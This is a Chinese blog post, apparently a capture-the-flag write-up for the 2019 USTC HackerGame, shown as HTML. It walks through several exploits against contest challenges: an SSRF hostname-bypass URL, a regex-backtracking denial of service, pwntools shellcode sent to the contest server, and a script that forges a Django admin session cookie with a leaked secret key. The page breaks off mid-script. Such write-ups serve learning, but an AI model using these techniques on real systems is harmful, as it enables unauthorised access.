@@ -1,0 +1,269 @@
+<!doctype html><html lang=en><head><meta name=generator content="Hugo 0.57.2"><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Sharing light, even in death"><title>2019 USTC HackerGame Writeup - Indexyz Blog</title><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/spectre.css@0.5.8/dist/spectre.min.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css><link rel=stylesheet href=https://blog.indexyz.me/css/syntax.css><link rel=stylesheet href=https://blog.indexyz.me/sass/main.min.bfe6bc4bb48fe5e39fc1dcbd6f38413f8c6c9bfcbb5541281b9be860cf0c3d8b.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/disqusjs@1.2/dist/disqusjs.css><script src=https://cdn.jsdelivr.net/npm/disqusjs@1.1/dist/disqus.js></script><script async src="https://www.googletagmanager.com/gtag/js?id=UA-97074604-1"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}
+gtag('js',new Date());gtag('config','UA-97074604-1');</script></head><body><header id=page-header><div class="container grid-lg"><a href=https://blog.indexyz.me/ class=title>Indexyz Blog</a><h2 class=description>Sharing light, even in death</h2><div><nav id=nav-menu role=navigation><a href=/>首页</a>
+<a href=/friends/>友链</a></nav></div></div></header><main><div class="container grid-lg"><section id=posts class=post-single><article temscope itemtype=http://schema.org/Article><header><h1 class=post-title itemprop="name headline"><a href=https://blog.indexyz.me/archives/2019-ustc-hackergame-writeup/ itemprop=url>2019 USTC HackerGame Writeup</a></h1><div class=post-meta-list><span class=post-meta><span>时间:</span>
+<time datetime=2019-10-23T01:51:17Z>2019-10-23</time></span>
+<span class=post-meta><span>分类:</span>
+<a href=/categories/ctf itemprop=url rel=index><span itemprop=name>CTF</span></a>
+&nbsp;</span></span></div></header><div class=post-body itemprop=articleBody><p>去年参加了 USTCLUG 的 HackerGame, 今年我又来答题啦（</p><h2 id=签到题>签到题</h2><p>题目很简单, 你只需要把按钮的 disabled 属性删掉就能拿到 flag 了</p><h2 id=白与夜>白与夜</h2><p>这题也很简单，我直接拖进 GIMP 就拿到了 Flag</p><p><img src=https://i.loli.net/2019/10/23/ZikDmBGdqWvKXeO.png alt=GIMP.png></p><h2 id=信息安全-2077>信息安全 2077</h2><p>打开 Inspector 可以看到题目的 Javascript 代码</p><div class=highlight><pre class=chroma><code class=language-javascript data-lang=javascript><span class=ln> 1</span><span class=p>(</span><span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
+<span class=ln> 2</span>    <span class=kd>var</span> <span class=nx>now</span> <span class=o>=</span> <span class=k>new</span> <span class=nb>Date</span><span class=p>().</span><span class=nx>toUTCString</span><span class=p>()</span>
+<span class=ln> 3</span>    <span class=kd>var</span> <span class=nx>main</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementsByTagName</span><span class=p>(</span><span class=s1>&#39;main&#39;</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
+<span class=ln> 4</span>    <span class=kd>var</span> <span class=nx>ua</span> <span class=o>=</span> <span class=s1>&#39;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) HEICORE/49.1.2623.213 Safari/537.36&#39;</span>
+<span class=ln> 5</span>    <span class=nx>fetch</span><span class=p>(</span><span class=s1>&#39;flag.txt&#39;</span><span class=p>,</span> <span class=p>{</span><span class=nx>method</span><span class=o>:</span> <span class=s1>&#39;POST&#39;</span><span class=p>,</span> <span class=nx>headers</span><span class=o>:</span> <span class=p>{</span><span class=s1>&#39;If-Unmodified-Since&#39;</span><span class=o>:</span> <span class=nx>now</span><span class=p>,</span> <span class=s1>&#39;User-Agent&#39;</span><span class=o>:</span> <span class=nx>ua</span><span class=p>}}).</span><span class=nx>then</span><span class=p>(</span><span class=kd>function</span> <span class=p>(</span><span class=nx>res</span><span class=p>)</span> <span class=p>{</span>
+<span class=ln> 6</span>    <span class=k>if</span> <span class=p>(</span><span class=nx>res</span><span class=p>.</span><span class=nx>ok</span><span class=p>)</span> <span class=p>{</span>
+<span class=ln> 7</span>        <span class=nx>res</span><span class=p>.</span><span class=nx>text</span><span class=p>().</span><span class=nx>then</span><span class=p>(</span><span class=kd>function</span> <span class=p>(</span><span class=nx>text</span><span class=p>)</span> <span class=p>{</span>
+<span class=ln> 8</span>        <span class=nx>main</span><span class=p>.</span><span class=nx>innerText</span> <span class=o>=</span> <span class=s1>&#39;The flag is &#34;&#39;</span> <span class=o>+</span> <span class=nx>text</span> <span class=o>+</span> <span class=s1>&#39;&#34;.&#39;</span>
+<span class=ln> 9</span>        <span class=p>})</span>
+<span class=ln>10</span>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+<span class=ln>11</span>        <span class=kd>var</span> <span class=nx>lastModified</span> <span class=o>=</span> <span class=nx>res</span><span class=p>.</span><span class=nx>headers</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;Last-Modified&#39;</span><span class=p>)</span>
+<span class=ln>12</span>        <span class=nx>setInterval</span><span class=p>(</span><span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
+<span class=ln>13</span>        <span class=kd>var</span> <span class=nx>diff</span> <span class=o>=</span> <span class=p>(</span><span class=k>new</span> <span class=nb>Date</span><span class=p>(</span><span class=nx>lastModified</span><span class=p>).</span><span class=nx>getTime</span><span class=p>()</span> <span class=o>-</span> <span class=nb>Date</span><span class=p>.</span><span class=nx>now</span><span class=p>())</span> <span class=o>/</span> <span class=mi>1000</span>
+<span class=ln>14</span>        <span class=kd>var</span> <span class=nx>diffSeconds</span> <span class=o>=</span> <span class=nb>Math</span><span class=p>.</span><span class=nx>floor</span><span class=p>(</span><span class=nx>diff</span> <span class=o>%</span> <span class=mi>86400</span><span class=p>),</span> <span class=nx>diffDays</span> <span class=o>=</span> <span class=nb>Math</span><span class=p>.</span><span class=nx>floor</span><span class=p>(</span><span class=nx>diff</span> <span class=o>/</span> <span class=mi>86400</span><span class=p>)</span>
+<span class=ln>15</span>        <span class=nx>main</span><span class=p>.</span><span class=nx>innerText</span> <span class=o>=</span> <span class=s1>&#39;Not yet! The competition will start after &#39;</span> <span class=o>+</span> <span class=nx>diffDays</span> <span class=o>+</span> <span class=s1>&#39; days and &#39;</span> <span class=o>+</span> <span class=nx>diffSeconds</span> <span class=o>+</span> <span class=s1>&#39; seconds.&#39;</span>
+<span class=ln>16</span>        <span class=p>},</span> <span class=mi>1000</span><span class=p>)</span>
+<span class=ln>17</span>    <span class=p>}</span>
+<span class=ln>18</span>    <span class=p>})</span>
+<span class=ln>19</span><span class=p>})()</span>
+</code></pre></div><p>根据代码, 我们需要 POST 一个 <code>lastModified</code> 匹配的 <code>If-Unmodified-Since</code> 到 flag.txt</p><p>那么我们直接用</p><div class=highlight><pre class=chroma><code class=language-javascript data-lang=javascript><span class=ln>1</span><span class=nx>fetch</span><span class=p>(</span><span class=s1>&#39;flag.txt&#39;</span><span class=p>,</span> <span class=p>{</span><span class=nx>method</span><span class=o>:</span> <span class=s1>&#39;POST&#39;</span><span class=p>,</span> <span class=nx>headers</span><span class=o>:</span> <span class=p>{</span><span class=s1>&#39;If-Unmodified-Since&#39;</span><span class=o>:</span> <span class=s1>&#39;Fri, 01 Oct 2077 00:00:00 GMT&#39;</span><span class=p>}}).</span><span class=nx>then</span><span class=p>(</span><span class=nx>res</span> <span class=p>=&gt;</span> <span class=nx>res</span><span class=p>.</span><span class=nx>text</span><span class=p>()).</span><span class=nx>then</span><span class=p>(</span><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>)</span>
+</code></pre></div><p>就可以拿到 flag 了</p><h2 id=宇宙终极问题>宇宙终极问题</h2><p>我只找到一个 42 的, 这题 Google 题（确信</p><h2 id=网页读取器>网页读取器</h2><p>下载代码, 可以看到检查 hostname 的逻辑</p><p>我们可以看到他会 strip <code>@</code> 前面的内容</p><p>我们可以构造出如下的 URL</p><pre><code>http://web/flag?@example.com
+</code></pre><h2 id=达拉崩吧大冒险>达拉崩吧大冒险</h2><p>打开题目, 把玩一阵之后发现在加攻击力的地方没有进行校验, 那我们可以通过输入负数来让我们的攻击力溢出</p><p>直接 DevTools 修改 Option 的 value 为 <code>-2700000000000000000</code> 然后提交就好了</p><h2 id=happy-lug>Happy LUG</h2><p>看到题目中的</p><blockquote><p>虽然浏览器访问不了，但这个域名确实是存在着的。</p></blockquote><p>我就知道应该是获取这个域名的 TXT 内容</p><p>当时做题的时候我一直给 ustclug 中间加了点, 然后一直拿不到记录, 知道有人提醒我换行没有点才反应过来（跑</p><h2 id=正则验证器>正则验证器</h2><p>是利用正则表达式的灾难性回溯卡 Python 一秒来获取 flag</p><p><a href=https://www.regular-expressions.info/catastrophic.html>拓展阅读</a></p><pre><code>Regex: (a*)*$
+String: aaaaaaaaaaaaaaaaaaaaaaab
+</code></pre><p>这道题长度卡的太死了（不然肯定各种奇怪的正则（跑</p><p>利用 regex101 也可以看到 <code>Catastrophic Backtracking</code> 的提示</p><p><img src=https://i.loli.net/2019/10/23/39XHJ1USwcqVGf2.png alt=image.png></p><h2 id=不同寻常的-python-考试>不同寻常的 Python 考试</h2><p>这题不讲，嗯 各种 Python 的奇怪判断</p><p>拿了 75 分, 要暴打出题人（被打</p><h2 id=小巧玲珑的-elf>小巧玲珑的 ELF</h2><p>直接 ELF 拖进 IDA Pro 就可以看到内部逻辑 然后写一个程序自动求解</p><div class=highlight><pre class=chroma><code class=language-javascript data-lang=javascript><span class=ln> 1</span><span class=k>const</span> <span class=nx>data</span> <span class=o>=</span> <span class=p>[</span>
+<span class=ln> 2</span>    <span class=mi>102</span><span class=p>,</span> <span class=mi>110</span><span class=p>,</span> <span class=mi>101</span><span class=p>,</span> <span class=mi>107</span><span class=p>,</span> <span class=o>-</span><span class=mi>125</span><span class=p>,</span> <span class=mi>78</span><span class=p>,</span> <span class=mi>109</span><span class=p>,</span> <span class=mi>116</span><span class=p>,</span> <span class=o>-</span><span class=mi>123</span><span class=p>,</span> <span class=mi>122</span><span class=p>,</span> <span class=mi>111</span><span class=p>,</span>
+<span class=ln> 3</span>    <span class=mi>87</span><span class=p>,</span> <span class=o>-</span><span class=mi>111</span><span class=p>,</span> <span class=mi>115</span><span class=p>,</span> <span class=o>-</span><span class=mi>112</span><span class=p>,</span> <span class=mi>79</span><span class=p>,</span> <span class=o>-</span><span class=mi>115</span><span class=p>,</span> <span class=mi>127</span><span class=p>,</span> <span class=mi>99</span><span class=p>,</span> <span class=mi>54</span><span class=p>,</span> <span class=mi>108</span><span class=p>,</span> <span class=mi>110</span><span class=p>,</span>
+<span class=ln> 4</span>    <span class=o>-</span><span class=mi>121</span><span class=p>,</span> <span class=mi>105</span><span class=p>,</span> <span class=o>-</span><span class=mi>93</span><span class=p>,</span> <span class=mi>111</span><span class=p>,</span> <span class=mi>88</span><span class=p>,</span> <span class=mi>115</span><span class=p>,</span> <span class=mi>102</span><span class=p>,</span> <span class=mi>86</span><span class=p>,</span> <span class=o>-</span><span class=mi>109</span><span class=p>,</span> <span class=o>-</span><span class=mi>97</span><span class=p>,</span> <span class=mi>105</span><span class=p>,</span> 
+<span class=ln> 5</span>    <span class=mi>112</span><span class=p>,</span> <span class=mi>56</span><span class=p>,</span> <span class=mi>118</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>120</span><span class=p>,</span> <span class=mi>111</span><span class=p>,</span> <span class=mi>99</span><span class=p>,</span> <span class=o>-</span><span class=mi>60</span><span class=p>,</span> <span class=o>-</span><span class=mi>126</span><span class=p>,</span> <span class=o>-</span><span class=mi>124</span><span class=p>,</span> <span class=o>-</span><span class=mi>66</span><span class=p>,</span> <span class=o>-</span><span class=mi>69</span><span class=p>,</span> <span class=o>-</span><span class=mi>51</span>
+<span class=ln> 6</span><span class=p>]</span>
+<span class=ln> 7</span>
+<span class=ln> 8</span><span class=k>const</span> <span class=nx>rbit</span> <span class=o>=</span> <span class=nx>data</span><span class=p>.</span><span class=nx>map</span><span class=p>((</span><span class=nx>it</span><span class=p>,</span> <span class=nx>index</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
+<span class=ln> 9</span>    <span class=kd>let</span> <span class=nx>i</span> <span class=o>=</span> <span class=nx>it</span> <span class=o>+</span> <span class=nx>index</span>
+<span class=ln>10</span>
+<span class=ln>11</span>    <span class=nx>i</span> <span class=o>^=</span> <span class=nx>index</span>
+<span class=ln>12</span>    <span class=nx>i</span> <span class=o>-=</span> <span class=mi>2</span> <span class=o>*</span> <span class=nx>index</span>
+<span class=ln>13</span>
+<span class=ln>14</span>    <span class=k>return</span> <span class=nx>i</span>
+<span class=ln>15</span><span class=p>})</span>
+<span class=ln>16</span>
+<span class=ln>17</span><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>Buffer</span><span class=p>.</span><span class=nx>from</span><span class=p>(</span><span class=nx>rbit</span><span class=p>).</span><span class=nx>toString</span><span class=p>())</span>
+</code></pre></div><h2 id=shell-骇客>Shell 骇客</h2><p>只做了第一题, 我永远喜欢 PwnTools （跑</p><div class=highlight><pre class=chroma><code class=language-python data-lang=python><span class=ln>1</span><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+<span class=ln>2</span><span class=kn>import</span> <span class=nn>time</span>
+<span class=ln>3</span><span class=n>context</span><span class=p>(</span><span class=n>arch</span> <span class=o>=</span> <span class=s1>&#39;x86_64&#39;</span><span class=p>,</span> <span class=n>os</span> <span class=o>=</span> <span class=s1>&#39;linux&#39;</span><span class=p>)</span>
+<span class=ln>4</span>
+<span class=ln>5</span><span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;202.38.93.241&#39;</span><span class=p>,</span> <span class=mi>10000</span><span class=p>)</span>
+<span class=ln>6</span><span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+<span class=ln>7</span><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;Token&#39;</span><span class=p>)</span>
+<span class=ln>8</span><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>sh</span><span class=p>()))</span>
+<span class=ln>9</span><span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span></code></pre></div><p>找到了 <code>pwn.encoders.encoder.encode</code> 这个方法, 但是没找到 <code>msfvenom</code> 这个工具, 可能还是我太菜了</p><p>而且我还把 target 当成 <code>x64</code> 了（捂脸</p><h2 id=三教奇妙夜>三教奇妙夜</h2><p>参考 <a href=https://stackoverflow.com/questions/37088517/ffmpeg-remove-sequentially-duplicate-frames>https://stackoverflow.com/questions/37088517/ffmpeg-remove-sequentially-duplicate-frames</a> 删除重复帧然后把帧抽成图片</p><div class=highlight><pre class=chroma><code class=language-bash data-lang=bash><span class=ln>1</span>ffmpeg -i input.mp4 -vf mpdecimate,setpts<span class=o>=</span>N/FRAME_RATE/TB out.mp4
+<span class=ln>2</span>ffmpeg -i out.mp4 -f image2 %02d.png</code></pre></div><h2 id=献给最好的你>献给最好的你</h2><p>反编译 JAR, 找到</p><p><code>com.hackergame.eternalEasterlyWind.data.LoginDataSource</code></p><p>看到了一串 base64</p><p>然后看了下前面的逻辑是把小写转大写, 大写转小写, 反操作一下就拿到了密码</p><p>这时候打开 app 输入就拿到 flag 了（懒得看下面代码</p><h2 id=天书残篇>天书残篇</h2><p>搜索一通发现是 <a href=https://en.wikipedia.org/wiki/Whitespace_(programming_language)>Whitespace (programming language)</a></p><p>找到一个 <a href=https://vii5ard.github.io/whitespace/>在线 IDE</a></p><p>找到 <code>label 53</code> 发现是输出 <code>Congratulations</code></p><p>于是往回推就找到了怎么生成的 flag</p><h2 id=我想要个家>我想要个家</h2><p>一开始是想拿 Docker 来做, 然后发现 <code>scratch</code> 还是有 /proc 目录 然后我就想到了 chroot</p><p>我直接塞了一个 busybox 进了 chroot 于是 sleep 10s 我就直接</p><pre><code>/busybox sleep 10
+</code></pre><p>要注意要把 host 上的 /dev 挂载到 chroot 下</p><pre><code>mount --rbind /dev dev/
+</code></pre><h2 id=被泄漏的姜戈>被泄漏的姜戈</h2><p>自己构造的 admin cookie, 学习了很多 django 相关的东西（跑</p><div class=highlight><pre class=chroma><code class=language-python data-lang=python><span class=ln> 1</span><span class=ch>#!/usr/bin/python3</span>
+<span class=ln> 2</span>
+<span class=ln> 3</span><span class=kn>import</span> <span class=nn>base64</span>
+<span class=ln> 4</span><span class=kn>import</span> <span class=nn>datetime</span>
+<span class=ln> 5</span><span class=kn>import</span> <span class=nn>json</span>
+<span class=ln> 6</span><span class=kn>import</span> <span class=nn>re</span>
+<span class=ln> 7</span><span class=kn>import</span> <span class=nn>time</span>
+<span class=ln> 8</span><span class=kn>import</span> <span class=nn>zlib</span>
+<span class=ln> 9</span><span class=kn>import</span> <span class=nn>hmac</span>
+<span class=ln>10</span><span class=kn>import</span> <span class=nn>hashlib</span>
+<span class=ln>11</span><span class=kn>from</span> <span class=nn>django.utils</span> <span class=kn>import</span> <span class=n>baseconv</span>
+<span class=ln>12</span><span class=kn>from</span> <span class=nn>django.core.signing</span> <span class=kn>import</span> <span class=n>Signer</span>
+<span class=ln>13</span>
+<span class=ln>14</span><span class=n>USER_SALT</span> <span class=o>=</span> <span class=s2>&#34;d7um#o19q+v24!vkgzrxme41wz5#_h0#f_6u62fx0m@k&amp;uwe39&#34;</span>
+<span class=ln>15</span>
+<span class=ln>16</span><span class=k>def</span> <span class=nf>b64_encode</span><span class=p>(</span><span class=n>s</span><span class=p>):</span>
+<span class=ln>17</span>    <span class=k>return</span> <span class=n>base64</span><span class=o>.</span><span class=n>urlsafe_b64encode</span><span class=p>(</span><span class=n>s</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;=&#39;</span><span class=p>)</span>
+<span class=ln>18</span>
+<span class=ln>19</span><span class=k>def</span> <span class=nf>b64_decode</span><span class=p>(</span><span class=n>s</span><span class=p>):</span>
+<span class=ln>20</span>    <span class=n>pad</span> <span class=o>=</span> <span class=s1>&#39;=&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>s</span><span class=p>)</span> <span class=o>%</span> <span class=mi>4</span><span class=p>)</span>
+<span class=ln>21</span>    <span class=k>return</span> <span class=n>base64</span><span class=o>.</span><span class=n>urlsafe_b64decode</span><span class=p>(</span><span class=n>s</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>pad</span><span class=p>))</span>
+<span class=ln>22</span>
+<span class=ln>23</span>
+<span class=ln>24</span><span class=k>def</span> <span class=nf>base64_hmac</span><span class=p>(</span><span class=n>salt</span><span class=p>,</span> <span class=n>value</span><span class=p>,</span> <span class=n>key</span><span class=p>):</span>
+<span class=ln>25</span>    <span class=k>return</span> <span class=n>b64_encode</span><span class=p>(</span><span class=n>salted_hmac</span><span class=p>(</span><span class=n>salt</span><span class=p>,</span> <span class=n>value</span><span class=p>,</span> <span class=n>key</span><span class=p>)</span><span class=o>.</span><span class=n>digest</span><span class=p>())</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
+<span class=ln>26</span>
+<span class=ln>27</span><span class=k>def</span> <span class=nf>unzip</span><span class=p>(</span><span class=n>value</span><span class=p>):</span>
+<span class=ln>28</span>    <span class=n>v</span> <span class=o>=</span> <span class=n>b64_decode</span><span class=p>(</span><span class=n>value</span><span class=p>)</span>
+<span class=ln>29</span>    <span class=n>data</span> <span class=o>=</span> <span class=n>zlib</span><span class=o>.</span><span class=n>decompress</span><span class=p>(</span><span class=n>v</span><span class=p>)</span>
+<span class=ln>30</span>
+<span class=ln>31</span>    <span class=k>return</span> <span class=n>data</span>
+<span class=ln>32</span>
+<span class=ln>33</span><span class=n>result</span> <span class=o>=</span> <span class=n>unzip</span><span class=p>(</span><span class=s2>&#34;eJxVjDEOwjAMRe_iGUVNZCUxIztniFw7JQWUSE07Ie4OlTrA-t97_wWJt7WkreclzQpnsHD63UaWR6470DvXWzPS6rrMo9kVc9Burk3z83K4fweFe_nWEwX0njJ7DDIMSDGyY0JyFicrqBxInUR4fwDjcTDI&#34;</span><span class=p>)</span>
+<span class=ln>34</span><span class=k>print</span><span class=p>(</span><span class=n>result</span><span class=p>)</span>
+<span class=ln>35</span>
+<span class=ln>36</span>
+<span class=ln>37</span><span class=k>def</span> <span class=nf>force_bytes</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=n>encoding</span><span class=o>=</span><span class=s1>&#39;utf-8&#39;</span><span class=p>,</span> <span class=n>strings_only</span><span class=o>=</span><span class=bp>False</span><span class=p>,</span> <span class=n>errors</span><span class=o>=</span><span class=s1>&#39;strict&#39;</span><span class=p>):</span>
+<span class=ln>38</span>    <span class=s2>&#34;&#34;&#34;
+</span><span class=ln>39</span><span class=s2>    Similar to smart_bytes, except that lazy instances are resolved to
+</span><span class=ln>40</span><span class=s2>    strings, rather than kept as lazy objects.
+</span><span class=ln>41</span><span class=s2>    If strings_only is True, don&#39;t convert (some) non-string-like objects.
+</span><span class=ln>42</span><span class=s2>    &#34;&#34;&#34;</span>
+<span class=ln>43</span>    <span class=c1># Handle the common case first for performance reasons.</span>
+<span class=ln>44</span>    <span class=k>if</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=nb>bytes</span><span class=p>):</span>
+<span class=ln>45</span>        <span class=k>if</span> <span class=n>encoding</span> <span class=o>==</span> <span class=s1>&#39;utf-8&#39;</span><span class=p>:</span>
+<span class=ln>46</span>            <span class=k>return</span> <span class=n>s</span>
+<span class=ln>47</span>        <span class=k>else</span><span class=p>:</span>
+<span class=ln>48</span>            <span class=k>return</span> <span class=n>s</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>,</span> <span class=n>errors</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=n>encoding</span><span class=p>,</span> <span class=n>errors</span><span class=p>)</span>
+<span class=ln>49</span>    <span class=k>if</span> <span class=n>strings_only</span> <span class=ow>and</span> <span class=n>is_protected_type</span><span class=p>(</span><span class=n>s</span><span class=p>):</span>
+<span class=ln>50</span>        <span class=k>return</span> <span class=n>s</span>
+<span class=ln>51</span>    <span class=k>if</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=n>memoryview</span><span class=p>):</span>
+<span class=ln>52</span>        <span class=k>return</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>s</span><span class=p>)</span>
+<span class=ln>53</span>    <span class=k>return</span> <span class=nb>str</span><span class=p>(</span><span class=n>s</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=n>encoding</span><span class=p>,</span> <span class=n>errors</span><span class=p>)</span>
+<span class=ln>54</span>
+<span class=ln>55</span>
+<span class=ln>56</span><span class=k>def</span> <span class=nf>hash_password</span><span class=p>(</span><span class=n>password</span><span class=p>):</span>
+<span class=ln>57</span>    <span class=n>key_salt</span> <span class=o>=</span> <span class=s2>&#34;django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash&#34;</span>
+<span class=ln>58</span>    <span class=n>key</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>sha1</span><span class=p>(</span><span class=n>force_bytes</span><span class=p>(</span><span class=n>key_salt</span><span class=p>)</span> <span class=o>+</span> <span class=n>force_bytes</span><span class=p>(</span><span class=n>USER_SALT</span><span class=p>))</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span>
+<span class=ln>59</span>
+<span class=ln>60</span>    <span class=k>return</span> <span class=n>hmac</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>msg</span><span class=o>=</span><span class=n>force_bytes</span><span class=p>(</span><span class=n>password</span><span class=p>),</span> <span class=n>digestmod</span><span class=o>=</span><span class=n>hashlib</span><span class=o>.</span><span class=n>sha1</span><span class=p>)</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
+<span class=ln>61</span>
+<span class=ln>62</span><span class=k>print</span><span class=p>(</span><span class=n>hash_password</span><span class=p>(</span><span class=s2>&#34;pbkdf2_sha256$150000$KkiPe6beZ4MS$UWamIORhxnonmT4yAVnoUxScVzrqDTiE9YrrKFmX3hE=&#34;</span><span class=p>))</span>
+<span class=ln>63</span>
+<span class=ln>64</span><span class=n>new_doc</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;{&#34;_auth_user_id&#34;:&#34;1&#34;,&#34;_auth_user_backend&#34;:&#34;django.contrib.auth.backends.ModelBackend&#34;,&#34;_auth_user_hash&#34;:&#34;569127665f950beb6dd4a55098a8768f58814b04&#34;}&#39;</span>
+<span class=ln>65</span>
+<span class=ln>66</span><span class=k>def</span> <span class=nf>sign</span><span class=p>(</span><span class=n>doc</span><span class=p>):</span>
+<span class=ln>67</span>    <span class=n>d</span> <span class=o>=</span> <span class=n>zlib</span><span class=o>.</span><span class=n>compress</span><span class=p>(</span><span class=n>doc</span><span class=p>)</span>
+<span class=ln>68</span>    <span class=n>d</span> <span class=o>=</span> <span class=s2>&#34;.&#34;</span> <span class=o>+</span> <span class=n>b64_encode</span><span class=p>(</span><span class=n>d</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
+<span class=ln>69</span>    <span class=n>ts</span> <span class=o>=</span> <span class=n>baseconv</span><span class=o>.</span><span class=n>base62</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()))</span>
+<span class=ln>70</span>
+<span class=ln>71</span>    <span class=n>value</span> <span class=o>=</span> <span class=s1>&#39;</span><span class=si>%s</span><span class=s1>:</span><span class=si>%s</span><span class=s1>&#39;</span> <span class=o>%</span> <span class=p>(</span><span class=n>d</span><span class=p>,</span> <span class=n>ts</span><span class=p>)</span>
+<span class=ln>72</span>    <span class=n>s</span> <span class=o>=</span> <span class=n>Signer</span><span class=p>(</span><span class=n>key</span><span class=o>=</span><span class=n>USER_SALT</span><span class=p>,</span> <span class=n>salt</span><span class=o>=</span><span class=s2>&#34;django.contrib.sessions.backends.signed_cookies&#34;</span><span class=p>)</span>
+<span class=ln>73</span>
+<span class=ln>74</span>    <span class=k>return</span> <span class=n>s</span><span class=o>.</span><span class=n>sign</span><span class=p>(</span><span class=n>value</span><span class=p>)</span>
+<span class=ln>75</span>
+<span class=ln>76</span>
+<span class=ln>77</span><span class=k>print</span><span class=p>(</span><span class=n>sign</span><span class=p>(</span><span class=n>new_doc</span><span class=p>))</span></code></pre></div><h2 id=powershell-迷宫>PowerShell 迷宫</h2><p>这题没啥难点，就拿 Powershell 暴力搜就完事了</p><div class=highlight><pre class=chroma><code class=language-powershell data-lang=powershell><span class=ln> 1</span><span class=n>using</span> <span class=n>namespace</span> <span class=n>System</span><span class=p>.</span><span class=n>Collections</span><span class=p>.</span><span class=n>Generic</span>
+<span class=ln> 2</span><span class=n>using</span> <span class=n>namespace</span> <span class=n>System</span>
+<span class=ln> 3</span>
+<span class=ln> 4</span><span class=k>function</span> <span class=n>Sacn</span><span class=p>(</span><span class=nv>$dir</span><span class=p>,</span> <span class=nv>$d</span><span class=p>)</span> <span class=p>{</span>
+<span class=ln> 5</span>    <span class=nv>$pos</span> <span class=p>=</span> <span class=no>[Tuple[int, int]]</span><span class=p>::</span><span class=n>new</span><span class=p>(</span><span class=nv>$_</span><span class=p>.</span><span class=n>X</span><span class=p>,</span> <span class=nv>$_</span><span class=p>.</span><span class=n>Y</span><span class=p>)</span>
+<span class=ln> 6</span>    <span class=nv>$path</span> <span class=p>=</span> <span class=s2>&#34;$dir/$d&#34;</span>
+<span class=ln> 7</span>    <span class=nb>Write-Output</span> <span class=s2>&#34;Scan dir: $path&#34;</span>
+<span class=ln> 8</span>    <span class=p>(</span><span class=nb>Get-ChildItem</span> <span class=nv>$path</span><span class=p>)</span> <span class=p>|</span> <span class=k>ForEach</span><span class=n>-Object</span> <span class=p>{</span>
+<span class=ln> 9</span>        <span class=k>if</span> <span class=p>(!(</span><span class=no>[string]</span><span class=p>::</span><span class=n>IsNullOrEmpty</span><span class=p>(</span><span class=nv>$_</span><span class=p>.</span><span class=n>Flag</span><span class=p>)))</span> <span class=p>{</span>
+<span class=ln>10</span>            <span class=nb>Write-Output</span> <span class=nv>$_</span><span class=p>.</span><span class=n>Flag</span>
+<span class=ln>11</span>            <span class=n>Exit</span>
+<span class=ln>12</span>        <span class=p>}</span>
+<span class=ln>13</span>    <span class=p>}</span>
+<span class=ln>14</span>
+<span class=ln>15</span>    <span class=p>(</span><span class=nb>Get-ChildItem</span> <span class=nv>$path</span><span class=p>)</span> <span class=p>|</span> <span class=k>ForEach</span><span class=n>-Object</span> <span class=p>{</span>
+<span class=ln>16</span>        <span class=nv>$dire</span> <span class=p>=</span> <span class=nv>$_</span><span class=p>.</span><span class=n>Direction</span>
+<span class=ln>17</span>
+<span class=ln>18</span>        <span class=nv>$isScan</span> <span class=p>=</span> <span class=nv>$true</span>
